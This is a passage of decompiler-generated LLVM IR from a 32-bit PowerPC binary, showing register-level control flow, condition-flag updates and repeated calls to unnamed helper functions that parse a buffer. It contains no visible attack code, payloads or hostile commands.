  %v1_10000c70 = add i32 %v2_10000c68, 36
  %v2_10000c70 = inttoptr i32 %v1_10000c70 to i32*
  %v3_10000c70 = load i32, i32* %v2_10000c70, align 4
  %v0_10000c74 = load i32, i32* %r23.global-to-local, align 4
  %v3_10000c74 = shl i32 %v0_10000c74, %v1_10000c6c
  store i32 %v3_10000c74, i32* %r0.global-to-local, align 4
  %v2_10000c78 = or i32 %v3_10000c74, %v3_10000c70
  store i32 %v2_10000c78, i32* %r9.global-to-local, align 4
  store i32 %v2_10000c78, i32* %v2_10000c70, align 4
  br i1 %v2_10000c64, label %dec_label_pc_10000c84, label %dec_label_pc_10000678

dec_label_pc_10000c84:                            ; preds = %dec_label_pc_10000c5c
  %v1_10000c84 = add i32 %v2_10000c5c, 1
  store i32 %v1_10000c84, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10000784

dec_label_pc_10000c8c:                            ; preds = %dec_label_pc_1000089c
  store i8 0, i8* %v2_10000688, align 1
  %v0_1000069c.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000069c

dec_label_pc_10000c94:                            ; preds = %dec_label_pc_10000640
  %v1_10000c94 = add i32 %v2_10000c8c, 8
  %v2_10000c94 = inttoptr i32 %v1_10000c94 to i32*
  %v3_10000c94 = load i32, i32* %v2_10000c94, align 4
  %v1_10000c98 = load i32, i32* %r25.global-to-local, align 4
  %v2_10000c98 = sub i32 %v1_10000c98, %v3_10000c94
  store i32 %v2_10000c98, i32* %r0.global-to-local, align 4
  %v1_10000c9c = icmp ult i32 %v2_10000c98, 30
  %v2_10000c9c = icmp ugt i32 %v2_10000c98, 30
  %v3_10000c9c = icmp eq i32 %v2_10000c98, 30
  store i1 %v1_10000c9c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000c9c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000c9c, i1* %cr7_eq.global-to-local, align 1
  %tmp72 = icmp ult i32 %v2_10000c98, 31
  br i1 %tmp72, label %dec_label_pc_10000758, label %dec_label_pc_10000668

dec_label_pc_10000ca8:                            ; preds = %dec_label_pc_10000808
  %v0_10000ca8 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000ca8, i32* @r3, align 4
  store i32 10240, i32* @r4, align 4
  store i32 268438708, i32* @lr, align 4
  %v0_10000cb0 = call i32 @function_1000ac0c()
  store i32 %v0_10000cb0, i32* %r3.global-to-local, align 4
  %v0_10000cb4 = load i32, i32* @r30, align 4
  %v1_10000cb4 = add i32 %v0_10000cb4, -533
  %v2_10000cb4 = inttoptr i32 %v1_10000cb4 to i32*
  %v3_10000cb4 = load i32, i32* %v2_10000cb4, align 4
  store i32 %v3_10000cb4, i32* %r3.global-to-local, align 4
  %v0_10000cb8 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000cb8, i32* %r4.global-to-local, align 4
  store i32 268438728, i32* @lr, align 4
  %v4_10000cc4 = call i32 @function_1000c090(i32 %v3_10000cb4, i32 %v0_10000cb8, i32 10240, i32 16386)
  store i32 %v4_10000cc4, i32* %r3.global-to-local, align 4
  store i32 %v4_10000cc4, i32* %r24.global-to-local, align 4
  %tmp73 = icmp slt i32 %v4_10000cc4, 1
  br i1 %tmp73, label %dec_label_pc_100018f0, label %dec_label_pc_10000cd0

dec_label_pc_10000cd0:                            ; preds = %dec_label_pc_10000ca8
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10000cd4 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000cd4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1000de58.37 to i32), i32* @r31, align 4
  store i32 %v4_10000cc4, i32* %r4.global-to-local, align 4
  store i32 268438764, i32* %lr.global-to-local, align 4
  %v5_10000ce8 = call i32 @function_1000ac30(i32 %v0_10000cd4, i32 %v4_10000cc4, i32 ptrtoint ([5 x i8]* @global_var_1000de58.37 to i32), i32 4)
  store i32 %v5_10000ce8, i32* %r3.global-to-local, align 4
  %v1_10000cec = icmp slt i32 %v5_10000ce8, -1
  %v2_10000cec = icmp sgt i32 %v5_10000ce8, -1
  %v3_10000cec = icmp eq i32 %v5_10000ce8, -1
  store i1 %v1_10000cec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000cec, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000cec, i1* %cr7_eq.global-to-local, align 1
  %v0_100017d4 = load i32, i32* %r24.global-to-local, align 4
  br i1 %v3_10000cec, label %dec_label_pc_100017d4, label %dec_label_pc_10000cf4

dec_label_pc_10000cf4:                            ; preds = %dec_label_pc_10000cd0, %dec_label_pc_100017d4
  %v0_10000cf4 = load i32, i32* @r31, align 4
  store i32 %v0_100017d4, i32* %r4.global-to-local, align 4
  %v0_10000d00 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000d00, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000d08.38 to i32), i32* %lr.global-to-local, align 4
  %v5_10000d04 = call i32 @function_1000ac30(i32 %v0_10000d00, i32 %v0_100017d4, i32 %v0_10000cf4, i32 4)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10000d0c = load i32, i32* %r18.global-to-local, align 4
  %v2_10000d0c = add i32 %v0_10000d0c, %v5_10000d04
  store i32 %v2_10000d0c, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_10000d14 = add i32 %v2_10000d0c, 10532
  %v4_10000d14 = inttoptr i32 %v3_10000d14 to i8*
  store i8 0, i8* %v4_10000d14, align 1
  store i32 46, i32* %r3.global-to-local, align 4
  store i32 268438816, i32* %lr.global-to-local, align 4
  %v3_10000d1c = call i32 @function_1000a238(i32 46, i32* null)
  %v0_10000d20 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000d20, i32* %r4.global-to-local, align 4
  %v0_10000d28 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000d28, i32* %r3.global-to-local, align 4
  store i32 268438832, i32* %lr.global-to-local, align 4
  %v3_10000d2c = inttoptr i32 %v0_10000d28 to i8*
  %v4_10000d2c = call i32 @function_1000af14(i8* %v3_10000d2c, i32 %v0_10000d20, i32 %v3_10000d1c)
  store i32 %v4_10000d2c, i32* %r3.global-to-local, align 4
  %v1_10000d30 = icmp slt i32 %v4_10000d2c, -1
  %v2_10000d30 = icmp sgt i32 %v4_10000d2c, -1
  %v3_10000d30 = icmp eq i32 %v4_10000d2c, -1
  store i1 %v1_10000d30, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000d30, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000d30, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000d30, label %dec_label_pc_10000d40, label %dec_label_pc_10000d38

dec_label_pc_10000d38:                            ; preds = %dec_label_pc_10000cf4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_10000d3c = load i32, i32* @r30, align 4
  %v2_10000d3c = add i32 %v1_10000d3c, 919
  %v3_10000d3c = inttoptr i32 %v2_10000d3c to i32*
  store i32 2, i32* %v3_10000d3c, align 4
  br label %dec_label_pc_10000d40

dec_label_pc_10000d40:                            ; preds = %dec_label_pc_10000cf4, %dec_label_pc_10000d38
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 45, i32* %r3.global-to-local, align 4
  store i32 268438860, i32* %lr.global-to-local, align 4
  %v3_10000d48 = call i32 @function_1000a238(i32 45, i32* null)
  %v0_10000d4c = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000d4c, i32* %r4.global-to-local, align 4
  %v0_10000d54 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000d54, i32* %r3.global-to-local, align 4
  store i32 268438876, i32* %lr.global-to-local, align 4
  %v3_10000d58 = inttoptr i32 %v0_10000d54 to i8*
  %v4_10000d58 = call i32 @function_1000af14(i8* %v3_10000d58, i32 %v0_10000d4c, i32 %v3_10000d48)
  store i32 %v4_10000d58, i32* %r3.global-to-local, align 4
  %v1_10000d5c = icmp slt i32 %v4_10000d58, -1
  %v2_10000d5c = icmp sgt i32 %v4_10000d58, -1
  %v3_10000d5c = icmp eq i32 %v4_10000d58, -1
  store i1 %v1_10000d5c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000d5c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000d5c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000d5c, label %dec_label_pc_10000d6c, label %dec_label_pc_10000d64

dec_label_pc_10000d64:                            ; preds = %dec_label_pc_10000d40
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10000d68 = load i32, i32* @r30, align 4
  %v2_10000d68 = add i32 %v1_10000d68, 919
  %v3_10000d68 = inttoptr i32 %v2_10000d68 to i32*
  store i32 1, i32* %v3_10000d68, align 4
  br label %dec_label_pc_10000d6c

dec_label_pc_10000d6c:                            ; preds = %dec_label_pc_10000d40, %dec_label_pc_10000d64
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_10000d74 = load i32, i32* @r30, align 4
  %v2_10000d74 = add i32 %v1_10000d74, 923
  %v3_10000d74 = inttoptr i32 %v2_10000d74 to i32*
  store i32 0, i32* %v3_10000d74, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 268438912, i32* %lr.global-to-local, align 4
  %v3_10000d7c = call i32 @function_1000a238(i32 44, i32* null)
  %v0_10000d80 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000d80, i32* %r4.global-to-local, align 4
  %v0_10000d88 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000d88, i32* %r3.global-to-local, align 4
  store i32 268438928, i32* %lr.global-to-local, align 4
  %v3_10000d8c = inttoptr i32 %v0_10000d88 to i8*
  %v4_10000d8c = call i32 @function_1000af14(i8* %v3_10000d8c, i32 %v0_10000d80, i32 %v3_10000d7c)
  store i32 %v4_10000d8c, i32* %r3.global-to-local, align 4
  %v1_10000d90 = icmp slt i32 %v4_10000d8c, -1
  %v2_10000d90 = icmp sgt i32 %v4_10000d8c, -1
  %v3_10000d90 = icmp eq i32 %v4_10000d8c, -1
  store i1 %v1_10000d90, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000d90, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000d90, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000d90, label %dec_label_pc_10000e40, label %dec_label_pc_10000d98

dec_label_pc_10000d98:                            ; preds = %dec_label_pc_10000d6c
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 268438948, i32* %lr.global-to-local, align 4
  %v3_10000da0 = call i32 @function_1000a238(i32 44, i32* null)
  %v0_10000da4 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000da4, i32* %r4.global-to-local, align 4
  %v0_10000dac = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000dac, i32* %r3.global-to-local, align 4
  store i32 268438964, i32* %lr.global-to-local, align 4
  %v3_10000db0 = inttoptr i32 %v0_10000dac to i8*
  %v4_10000db0 = call i32 @function_1000af14(i8* %v3_10000db0, i32 %v0_10000da4, i32 %v3_10000da0)
  store i32 %v4_10000db0, i32* %r3.global-to-local, align 4
  %v0_10000db8 = load i32, i32* %r18.global-to-local, align 4
  %v2_10000db8 = add i32 %v0_10000db8, %v4_10000db0
  store i32 %v2_10000db8, i32* %r9.global-to-local, align 4
  %v1_10000dbc = add i32 %v2_10000db8, 10532
  %v2_10000dbc = inttoptr i32 %v1_10000dbc to i8*
  %v3_10000dbc = load i8, i8* %v2_10000dbc, align 1
  %v4_10000dbc = zext i8 %v3_10000dbc to i32
  store i32 %v4_10000dbc, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_10000dc8 = xor i32 %v4_10000dbc, 32
  %v1_10000dcc = sub nsw i32 0, %v1_10000dc8
  %v2_10000dcc = xor i32 %v4_10000dbc, -33
  %v4_10000dcc = icmp uge i32 %v2_10000dcc, %v1_10000dcc
  %v2_10000dd0 = zext i1 %v4_10000dcc to i32
  %v3_10000dd0 = add i32 %v2_10000dd0, %v4_10000db0
  store i32 %v3_10000dd0, i32* %r11.global-to-local, align 4
  %v0_10000dd4 = load i32, i32* %r20.global-to-local, align 4
  %v2_10000dd4 = add i32 %v3_10000dd0, %v0_10000dd4
  store i32 %v2_10000dd4, i32* %r28.global-to-local, align 4
  store i32 %v2_10000dd4, i32* %r3.global-to-local, align 4
  %v1_10000ddc = load i32, i32* %r24.global-to-local, align 4
  %v2_10000ddc = sub i32 %v1_10000ddc, %v3_10000dd0
  store i32 %v2_10000ddc, i32* %r4.global-to-local, align 4
  store i32 %v3_10000dd0, i32* %r31.global-to-local, align 4
  store i32 268439016, i32* %lr.global-to-local, align 4
  %v5_10000de4 = call i32 @function_1000ac30(i32 %v2_10000dd4, i32 %v2_10000ddc, i32 ptrtoint ([3 x i8]* @global_var_1000de34.24 to i32), i32 2)
  store i32 %v5_10000de4, i32* %r3.global-to-local, align 4
  %v1_10000de8 = icmp slt i32 %v5_10000de4, -1
  %v2_10000de8 = icmp sgt i32 %v5_10000de4, -1
  %v3_10000de8 = icmp eq i32 %v5_10000de4, -1
  store i1 %v1_10000de8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000de8, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000de8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000de8, label %dec_label_pc_10000e40, label %dec_label_pc_10000df0

dec_label_pc_10000df0:                            ; preds = %dec_label_pc_10000d98
  %v1_10000df0 = icmp slt i32 %v5_10000de4, 1
  %v2_10000df0 = icmp sgt i32 %v5_10000de4, 1
  %v3_10000df0 = icmp eq i32 %v5_10000de4, 1
  store i1 %v1_10000df0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000df0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000df0, i1* %cr7_eq.global-to-local, align 1
  %tmp74 = icmp slt i32 %v5_10000de4, 2
  br i1 %tmp74, label %dec_label_pc_10000dfc, label %dec_label_pc_10000df8

dec_label_pc_10000df8:                            ; preds = %dec_label_pc_10000df0
  %v1_10000df8 = add i32 %v5_10000de4, -2
  store i32 %v1_10000df8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000dfc

dec_label_pc_10000dfc:                            ; preds = %dec_label_pc_10000df0, %dec_label_pc_10000df8
  %v1_10000e00 = phi i32 [ %v5_10000de4, %dec_label_pc_10000df0 ], [ %v1_10000df8, %dec_label_pc_10000df8 ]
  %v0_10000dfc = load i32, i32* %r18.global-to-local, align 4
  %v1_10000dfc = load i32, i32* %r31.global-to-local, align 4
  %v2_10000dfc = add i32 %v0_10000dfc, %v1_10000e00
  %v2_10000e00 = add i32 %v2_10000dfc, %v1_10000dfc
  store i32 %v2_10000e00, i32* %r9.global-to-local, align 4
  %v0_10000e04 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000e04, i32* %r3.global-to-local, align 4
  %v0_10000e08 = load i32, i32* %r29.global-to-local, align 4
  %v1_10000e08 = trunc i32 %v0_10000e08 to i8
  %v3_10000e08 = add i32 %v2_10000e00, 10532
  %v4_10000e08 = inttoptr i32 %v3_10000e08 to i8*
  store i8 %v1_10000e08, i8* %v4_10000e08, align 1
  store i32 268439056, i32* @lr, align 4
  %v1_10000e0c = inttoptr i32 %v0_10000e04 to i8*
  %v2_10000e0c = call i32 @function_1000ab64(i8* %v1_10000e0c)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_10000e0c, i32* %r29.global-to-local, align 4
  store i32 43, i32* %r3.global-to-local, align 4
  store i32 268439072, i32* %lr.global-to-local, align 4
  %v3_10000e1c = call i32 @function_1000a238(i32 43, i32* null)
  %v0_10000e20 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10000e20, i32* %r4.global-to-local, align 4
  %v0_10000e28 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000e28, i32* %r3.global-to-local, align 4
  store i32 268439088, i32* %lr.global-to-local, align 4
  %v3_10000e2c = inttoptr i32 %v0_10000e28 to i8*
  %v4_10000e2c = call i32 @function_1000af14(i8* %v3_10000e2c, i32 %v0_10000e20, i32 %v3_10000e1c)
  store i32 %v4_10000e2c, i32* %r3.global-to-local, align 4
  %v1_10000e30 = icmp slt i32 %v4_10000e2c, 0
  %v2_10000e30 = icmp sgt i32 %v4_10000e2c, 0
  %v3_10000e30 = icmp eq i32 %v4_10000e2c, 0
  store i1 %v1_10000e30, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000e30, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000e30, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000e30, label %dec_label_pc_10000e40, label %dec_label_pc_10000e38

dec_label_pc_10000e38:                            ; preds = %dec_label_pc_10000dfc
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10000e3c = load i32, i32* @r30, align 4
  %v2_10000e3c = add i32 %v1_10000e3c, 923
  %v3_10000e3c = inttoptr i32 %v2_10000e3c to i32*
  store i32 1, i32* %v3_10000e3c, align 4
  br label %dec_label_pc_10000e40

dec_label_pc_10000e40:                            ; preds = %dec_label_pc_10000dfc, %dec_label_pc_10000d98, %dec_label_pc_10000d6c, %dec_label_pc_10000e38
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_10000e48 = load i32, i32* @r30, align 4
  %v2_10000e48 = add i32 %v1_10000e48, 927
  %v3_10000e48 = inttoptr i32 %v2_10000e48 to i32*
  store i32 0, i32* %v3_10000e48, align 4
  store i32 41, i32* %r3.global-to-local, align 4
  store i32 268439124, i32* %lr.global-to-local, align 4
  %v3_10000e50 = call i32 @function_1000a238(i32 41, i32* null)
  %v0_10000e54 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000e54, i32* %r4.global-to-local, align 4
  %v0_10000e5c = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000e5c, i32* %r3.global-to-local, align 4
  store i32 268439140, i32* %lr.global-to-local, align 4
  %v3_10000e60 = inttoptr i32 %v0_10000e5c to i8*
  %v4_10000e60 = call i32 @function_1000af14(i8* %v3_10000e60, i32 %v0_10000e54, i32 %v3_10000e50)
  store i32 %v4_10000e60, i32* %r3.global-to-local, align 4
  %v1_10000e64 = icmp slt i32 %v4_10000e60, -1
  %v2_10000e64 = icmp sgt i32 %v4_10000e60, -1
  %v3_10000e64 = icmp eq i32 %v4_10000e60, -1
  store i1 %v1_10000e64, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000e64, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000e64, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000e64, label %dec_label_pc_10000f14, label %dec_label_pc_10000e6c

dec_label_pc_10000e6c:                            ; preds = %dec_label_pc_10000e40
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 41, i32* %r3.global-to-local, align 4
  store i32 268439160, i32* %lr.global-to-local, align 4
  %v3_10000e74 = call i32 @function_1000a238(i32 41, i32* null)
  %v0_10000e78 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000e78, i32* %r4.global-to-local, align 4
  %v0_10000e80 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000e80, i32* %r3.global-to-local, align 4
  store i32 268439176, i32* %lr.global-to-local, align 4
  %v3_10000e84 = inttoptr i32 %v0_10000e80 to i8*
  %v4_10000e84 = call i32 @function_1000af14(i8* %v3_10000e84, i32 %v0_10000e78, i32 %v3_10000e74)
  store i32 %v4_10000e84, i32* %r3.global-to-local, align 4
  %v0_10000e8c = load i32, i32* %r18.global-to-local, align 4
  %v2_10000e8c = add i32 %v0_10000e8c, %v4_10000e84
  store i32 %v2_10000e8c, i32* %r9.global-to-local, align 4
  %v1_10000e90 = add i32 %v2_10000e8c, 10532
  %v2_10000e90 = inttoptr i32 %v1_10000e90 to i8*
  %v3_10000e90 = load i8, i8* %v2_10000e90, align 1
  %v4_10000e90 = zext i8 %v3_10000e90 to i32
  store i32 %v4_10000e90, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_10000e9c = xor i32 %v4_10000e90, 32
  %v1_10000ea0 = sub nsw i32 0, %v1_10000e9c
  %v2_10000ea0 = xor i32 %v4_10000e90, -33
  %v4_10000ea0 = icmp uge i32 %v2_10000ea0, %v1_10000ea0
  %v2_10000ea4 = zext i1 %v4_10000ea0 to i32
  %v3_10000ea4 = add i32 %v2_10000ea4, %v4_10000e84
  store i32 %v3_10000ea4, i32* %r11.global-to-local, align 4
  %v0_10000ea8 = load i32, i32* %r20.global-to-local, align 4
  %v2_10000ea8 = add i32 %v3_10000ea4, %v0_10000ea8
  store i32 %v2_10000ea8, i32* %r28.global-to-local, align 4
  store i32 %v2_10000ea8, i32* %r3.global-to-local, align 4
  %v1_10000eb0 = load i32, i32* %r24.global-to-local, align 4
  %v2_10000eb0 = sub i32 %v1_10000eb0, %v3_10000ea4
  store i32 %v2_10000eb0, i32* %r4.global-to-local, align 4
  store i32 %v3_10000ea4, i32* %r31.global-to-local, align 4
  store i32 268439228, i32* %lr.global-to-local, align 4
  %v5_10000eb8 = call i32 @function_1000ac30(i32 %v2_10000ea8, i32 %v2_10000eb0, i32 ptrtoint ([3 x i8]* @global_var_1000de34.24 to i32), i32 2)
  store i32 %v5_10000eb8, i32* %r3.global-to-local, align 4
  %v1_10000ebc = icmp slt i32 %v5_10000eb8, -1
  %v2_10000ebc = icmp sgt i32 %v5_10000eb8, -1
  %v3_10000ebc = icmp eq i32 %v5_10000eb8, -1
  store i1 %v1_10000ebc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000ebc, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000ebc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000ebc, label %dec_label_pc_10000f14, label %dec_label_pc_10000ec4

dec_label_pc_10000ec4:                            ; preds = %dec_label_pc_10000e6c
  %v1_10000ec4 = icmp slt i32 %v5_10000eb8, 1
  %v2_10000ec4 = icmp sgt i32 %v5_10000eb8, 1
  %v3_10000ec4 = icmp eq i32 %v5_10000eb8, 1
  store i1 %v1_10000ec4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000ec4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000ec4, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp slt i32 %v5_10000eb8, 2
  br i1 %tmp75, label %dec_label_pc_10000ed0, label %dec_label_pc_10000ecc

dec_label_pc_10000ecc:                            ; preds = %dec_label_pc_10000ec4
  %v1_10000ecc = add i32 %v5_10000eb8, -2
  store i32 %v1_10000ecc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000ed0

dec_label_pc_10000ed0:                            ; preds = %dec_label_pc_10000ec4, %dec_label_pc_10000ecc
  %v1_10000ed4 = phi i32 [ %v5_10000eb8, %dec_label_pc_10000ec4 ], [ %v1_10000ecc, %dec_label_pc_10000ecc ]
  %v0_10000ed0 = load i32, i32* %r18.global-to-local, align 4
  %v1_10000ed0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10000ed0 = add i32 %v0_10000ed0, %v1_10000ed4
  %v2_10000ed4 = add i32 %v2_10000ed0, %v1_10000ed0
  store i32 %v2_10000ed4, i32* %r9.global-to-local, align 4
  %v0_10000ed8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000ed8, i32* %r3.global-to-local, align 4
  %v0_10000edc = load i32, i32* %r29.global-to-local, align 4
  %v1_10000edc = trunc i32 %v0_10000edc to i8
  %v3_10000edc = add i32 %v2_10000ed4, 10532
  %v4_10000edc = inttoptr i32 %v3_10000edc to i8*
  store i8 %v1_10000edc, i8* %v4_10000edc, align 1
  store i32 268439268, i32* @lr, align 4
  %v1_10000ee0 = inttoptr i32 %v0_10000ed8 to i8*
  %v2_10000ee0 = call i32 @function_1000ab64(i8* %v1_10000ee0)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_10000ee0, i32* %r29.global-to-local, align 4
  store i32 42, i32* %r3.global-to-local, align 4
  store i32 268439284, i32* %lr.global-to-local, align 4
  %v3_10000ef0 = call i32 @function_1000a238(i32 42, i32* null)
  %v0_10000ef4 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10000ef4, i32* %r4.global-to-local, align 4
  %v0_10000efc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000efc, i32* %r3.global-to-local, align 4
  store i32 268439300, i32* %lr.global-to-local, align 4
  %v3_10000f00 = inttoptr i32 %v0_10000efc to i8*
  %v4_10000f00 = call i32 @function_1000af14(i8* %v3_10000f00, i32 %v0_10000ef4, i32 %v3_10000ef0)
  store i32 %v4_10000f00, i32* %r3.global-to-local, align 4
  %v1_10000f04 = icmp slt i32 %v4_10000f00, 0
  %v2_10000f04 = icmp sgt i32 %v4_10000f00, 0
  %v3_10000f04 = icmp eq i32 %v4_10000f00, 0
  store i1 %v1_10000f04, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000f04, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000f04, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000f04, label %dec_label_pc_10000f14, label %dec_label_pc_10000f0c

dec_label_pc_10000f0c:                            ; preds = %dec_label_pc_10000ed0
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10000f10 = load i32, i32* @r30, align 4
  %v2_10000f10 = add i32 %v1_10000f10, 927
  %v3_10000f10 = inttoptr i32 %v2_10000f10 to i32*
  store i32 1, i32* %v3_10000f10, align 4
  br label %dec_label_pc_10000f14

dec_label_pc_10000f14:                            ; preds = %dec_label_pc_10000ed0, %dec_label_pc_10000e6c, %dec_label_pc_10000e40, %dec_label_pc_10000f0c
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 268439328, i32* %lr.global-to-local, align 4
  %v3_10000f1c = call i32 @function_1000a238(i32 40, i32* null)
  %v0_10000f20 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000f20, i32* %r4.global-to-local, align 4
  %v0_10000f28 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000f28, i32* %r3.global-to-local, align 4
  store i32 268439344, i32* %lr.global-to-local, align 4
  %v3_10000f2c = inttoptr i32 %v0_10000f28 to i8*
  %v4_10000f2c = call i32 @function_1000af14(i8* %v3_10000f2c, i32 %v0_10000f20, i32 %v3_10000f1c)
  store i32 %v4_10000f2c, i32* %r3.global-to-local, align 4
  %v1_10000f30 = icmp slt i32 %v4_10000f2c, -1
  %v2_10000f30 = icmp sgt i32 %v4_10000f2c, -1
  %v3_10000f30 = icmp eq i32 %v4_10000f2c, -1
  store i1 %v1_10000f30, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000f30, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000f30, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000f30, label %dec_label_pc_10001770, label %dec_label_pc_10000f38

dec_label_pc_10000f38:                            ; preds = %dec_label_pc_10000f14
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 268439364, i32* %lr.global-to-local, align 4
  %v3_10000f40 = call i32 @function_1000a238(i32 40, i32* null)
  %v0_10000f44 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000f44, i32* %r4.global-to-local, align 4
  %v0_10000f4c = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000f4c, i32* %r3.global-to-local, align 4
  store i32 268439380, i32* %lr.global-to-local, align 4
  %v3_10000f50 = inttoptr i32 %v0_10000f4c to i8*
  %v4_10000f50 = call i32 @function_1000af14(i8* %v3_10000f50, i32 %v0_10000f44, i32 %v3_10000f40)
  store i32 %v4_10000f50, i32* %r3.global-to-local, align 4
  %v0_10000f58 = load i32, i32* %r18.global-to-local, align 4
  %v2_10000f58 = add i32 %v0_10000f58, %v4_10000f50
  store i32 %v2_10000f58, i32* %r9.global-to-local, align 4
  %v1_10000f5c = add i32 %v2_10000f58, 10532
  %v2_10000f5c = inttoptr i32 %v1_10000f5c to i8*
  %v3_10000f5c = load i8, i8* %v2_10000f5c, align 1
  %v4_10000f5c = zext i8 %v3_10000f5c to i32
  store i32 %v4_10000f5c, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_10000f68 = xor i32 %v4_10000f5c, 32
  %v1_10000f6c = sub nsw i32 0, %v1_10000f68
  %v2_10000f6c = xor i32 %v4_10000f5c, -33
  %v4_10000f6c = icmp uge i32 %v2_10000f6c, %v1_10000f6c
  %v2_10000f70 = zext i1 %v4_10000f6c to i32
  %v3_10000f70 = add i32 %v2_10000f70, %v4_10000f50
  store i32 %v3_10000f70, i32* %r11.global-to-local, align 4
  %v0_10000f74 = load i32, i32* %r20.global-to-local, align 4
  %v2_10000f74 = add i32 %v3_10000f70, %v0_10000f74
  store i32 %v2_10000f74, i32* %r29.global-to-local, align 4
  store i32 %v2_10000f74, i32* %r3.global-to-local, align 4
  %v1_10000f7c = load i32, i32* %r24.global-to-local, align 4
  %v2_10000f7c = sub i32 %v1_10000f7c, %v3_10000f70
  store i32 %v2_10000f7c, i32* %r4.global-to-local, align 4
  store i32 %v3_10000f70, i32* %r31.global-to-local, align 4
  store i32 268439432, i32* %lr.global-to-local, align 4
